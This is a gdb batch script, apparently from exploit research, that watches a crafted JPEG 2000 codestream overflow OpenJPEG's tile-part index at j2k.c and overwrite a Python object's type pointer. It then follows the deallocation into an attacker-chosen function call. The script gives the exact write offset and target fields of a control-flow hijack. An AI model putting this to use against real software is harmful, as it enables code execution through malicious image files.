# Observe a natural finalization call through an attacker-chosen ob_type.
# gdb observes only; it never writes memory. Invoke from the harness OUTDIR as
#   gdb -q -batch -x chosen-call.gdb --args python3 PROBE CODESTREAM
# with a codestream whose tile part 154 writes &PyDict_Type at base+24*154+8.
set pagination off
set breakpoint pending on
break j2k.c:5085
run
set $hit = 0
while $hit < 154
  continue
  set $hit = $hit + 1
end
set $b = (char*)l_cstr_index->tile_index[p_j2k->m_current_tile_number].tp_index
set $obj = (void*)($b + 24*154)
printf "PRE OBJ=%p REF=%ld TYPE=%016lx\n", $obj, *(unsigned long*)$obj, *(unsigned long*)($obj+8)
printf "WRITE W1=%016lx W2=%016lx\n", (unsigned long)l_current_pos, (unsigned long)(l_current_pos + p_j2k->m_specific_param.m_decoder.m_sot_length + 2)
until j2k.c:5091
printf "POST REF=%ld TYPE=%016lx\n", *(unsigned long*)$obj, *(unsigned long*)($obj+8)
delete 1
break _Py_Dealloc if $rdi == $obj
continue
printf "DEALLOC pc=%p rdi=%p TYPE=%016lx\n", $pc, $rdi, *(unsigned long*)($rdi+8)
si
si
si
printf "CHOSEN_CALL pc=%p\n", $pc
printf "TYPES Dict=%p Code=%p DictDealloc=%p CodeDealloc=%p\n", &PyDict_Type, &PyCode_Type, *(unsigned long*)((char*)&PyDict_Type+0x30), *(unsigned long*)((char*)&PyCode_Type+0x30)
quit
